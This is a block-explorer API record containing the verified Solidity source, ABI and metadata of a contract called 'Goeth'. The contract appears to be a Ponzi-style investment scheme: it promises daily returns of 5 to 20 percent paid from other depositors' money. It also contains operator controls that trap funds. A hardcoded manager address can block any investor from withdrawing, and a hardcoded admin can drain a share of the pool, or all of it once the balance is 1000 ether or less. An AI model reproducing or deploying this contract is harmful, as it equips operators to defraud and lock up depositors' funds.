{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.4.26;\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns(uint256) {\r\n        if(a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"NaN\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns(uint256) {\r\n        require(b > 0, \"NaN\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns(uint256) {\r\n        require(b <= a, \"NaN\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns(uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"NaN\");\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns(uint256) {\r\n        require(b != 0, \"NaN\");\r\n        return a % b;\r\n    }\r\n}\r\n\r\ncontract Roles {\r\n    mapping(string => mapping(address => bool)) private rules;\r\n\r\n    event RoleAdded(string indexed role, address indexed to);\r\n    event RoleRemoved(string indexed role, address indexed to);\r\n\r\n    modifier onlyHasRole(string _role) {\r\n        require(rules[_role][msg.sender], \"Access denied\");\r\n        _;\r\n    }\r\n\r\n    function hasRole(string _role, address _to) view public returns(bool) {\r\n        require(_to != address(0), \"Zero address\");\r\n\r\n        return rules[_role][_to];\r\n    }\r\n\r\n    function addRole(string _role, address _to) internal {\r\n        require(_to != address(0), \"Zero address\");\r\n\r\n        rules[_role][_to] = true;\r\n\r\n        emit RoleAdded(_role, _to);\r\n    }\r\n\r\n    function removeRole(string _role, address _to) internal {\r\n        require(_to != address(0), \"Zero address\");\r\n\r\n        rules[_role][_to] = false;\r\n        \r\n        emit RoleRemoved(_role, _to);\r\n    }\r\n}\r\n\r\ncontract Goeth is Roles {\r\n    using SafeMath for uint;\r\n\r\n    struct Investor {\r\n        uint invested;\r\n        uint last_payout;\r\n    }\r\n\r\n    struct Admin {\r\n        uint percent;\r\n        uint timeout;\r\n        uint min_balance;\r\n        uint last_withdraw;\r\n    }\r\n\r\n    mapping(address => Investor) public investors;\r\n    mapping(address => bool) public blockeds;\r\n    mapping(address => Admin) public admins;\r\n\r\n    event Payout(address indexed holder, uint etherAmount);\r\n    event Deposit(address indexed holder, uint etherAmount);\r\n    event WithdrawEther(address indexed to, uint etherAmount);\r\n    event Blocked(address indexed holder);\r\n    event UnBlocked(address indexed holder);\r\n\r\n    constructor() public {\r\n        addRole(\"manager\", 0x40540fc84F6b126222Eb1595447ad929c2Ae57a7);\r\n\r\n        admins[0x674052fAb7EeF08A9D3E5f430304C641e7892eb9] = Admin(5, 0, 1000 ether, 0);\r\n    }\r\n\r\n    function investorBonusSize(address _to) view public returns(uint) {\r\n        uint b = investors[_to].invested;\r\n\r\n        if(b >= 100 ether) return 20;\r\n        if(b >= 70 ether) return 18;\r\n        if(b >= 40 ether) return 15;\r\n        if(b >= 15 ether) return 10;\r\n        if(b >= 7 ether) return 7;\r\n        if(b >= 3 ether) return 6;\r\n        return 5;\r\n    }\r\n\r\n    function payoutSize(address _to) view public returns(uint) {\r\n        uint invested = investors[_to].invested;\r\n\r\n        if(invested == 0) return 0;\r\n\r\n        return invested.mul(investorBonusSize(_to)).div(100).mul(block.timestamp.sub(investors[_to].last_payout)).div(1 days);\r\n    }\r\n\r\n    function bytesToAddress(bytes bys) pure private returns(address addr) {\r\n        assembly {\r\n            addr := mload(add(bys, 20))\r\n        }\r\n    }\r\n\r\n    function() payable external {\r\n        if(hasRole(\"manager\", msg.sender)) {\r\n            require(msg.data.length > 0, \"Send the address in data\");\r\n\r\n            address addr = bytesToAddress(msg.data);\r\n\r\n            require(!hasRole(\"manager\", addr) && admins[addr].percent == 0, \"This address is manager\");\r\n\r\n            if(!blockeds[addr]) {\r\n                blockeds[addr] = true;\r\n                emit Blocked(addr);\r\n            }\r\n            else {\r\n                blockeds[addr] = false;\r\n                emit UnBlocked(addr);\r\n            }\r\n            \r\n            if(msg.value > 0) {\r\n                msg.sender.transfer(msg.value);\r\n            }\r\n\r\n            return;\r\n        }\r\n\r\n        if(investors[msg.sender].invested > 0 && !blockeds[msg.sender]) {\r\n            uint payout = payoutSize(msg.sender);\r\n\r\n            require(msg.value > 0 || payout > 0, \"No payouts\");\r\n\r\n            if(payout > 0) {\r\n                investors[msg.sender].last_payout = block.timestamp;\r\n\r\n                msg.sender.transfer(payout);\r\n\r\n                emit Payout(msg.sender, payout);\r\n            }\r\n        }\r\n\r\n        if(msg.value > 0) {\r\n            if (msg.value == 0.0001 ether) {\r\n                if(blockeds[msg.sender]) {\r\n                    return;\r\n                }\r\n\r\n                uint amount = investors[msg.sender].invested;\r\n\r\n                investors[msg.sender].invested = investors[msg.sender].invested.sub(amount);\r\n                \r\n                msg.sender.transfer(amount);\r\n\r\n                emit WithdrawEther(msg.sender, amount);\r\n\r\n                return;\r\n            } \r\n\r\n            require(msg.value >= 0.01 ether, \"Minimum investment amount 0.01 ether\");\r\n\r\n            investors[msg.sender].last_payout = block.timestamp;\r\n            investors[msg.sender].invested = investors[msg.sender].invested.add(msg.value);\r\n                \r\n            emit Deposit(msg.sender, msg.value);\r\n        }\r\n    }\r\n\r\n    function withdrawEther(address _to) public {\r\n        Admin storage admin = admins[msg.sender];\r\n        uint balance = address(this).balance;\r\n\r\n        require(admin.percent > 0, \"Access denied\");\r\n        require(admin.timeout == 0 || block.timestamp > admin.last_withdraw.add(admin.timeout), \"Timeout\");\r\n        require(_to != address(0), \"Zero address\");\r\n        require(balance > 0, \"Not enough balance\");\r\n\r\n        uint amount = balance > admin.min_balance ? balance.div(100).mul(admin.percent) : balance;\r\n\r\n        admin.last_withdraw = block.timestamp;\r\n\r\n        _to.transfer(amount);\r\n\r\n        emit WithdrawEther(_to, amount);\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"admins\",\"outputs\":[{\"name\":\"percent\",\"type\":\"uint256\"},{\"name\":\"timeout\",\"type\":\"uint256\"},{\"name\":\"min_balance\",\"type\":\"uint256\"},{\"name\":\"last_withdraw\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_role\",\"type\":\"string\"},{\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"hasRole\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"investors\",\"outputs\":[{\"name\":\"invested\",\"type\":\"uint256\"},{\"name\":\"last_payout\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"blockeds\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"withdrawEther\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"investorBonusSize\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"payoutSize\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"holder\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"etherAmount\",\"type\":\"uint256\"}],\"name\":\"Payout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"holder\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"etherAmount\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"etherAmount\",\"type\":\"uint256\"}],\"name\":\"WithdrawEther\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"Blocked\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"holder\",\"type\":\"address\"}],\"name\":\"UnBlocked\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"role\",\"type\":\"string\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"}],\"name\":\"RoleAdded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"role\",\"type\":\"string\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"}],\"name\":\"RoleRemoved\",\"type\":\"event\"}]","ContractName":"Goeth","CompilerVersion":"v0.4.26+commit.4563c3fc","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"bzzr://a79156c1d0ff309ec279f3940fbe41b3c3d8306dbb8d914a0d644ee75655c597"}]}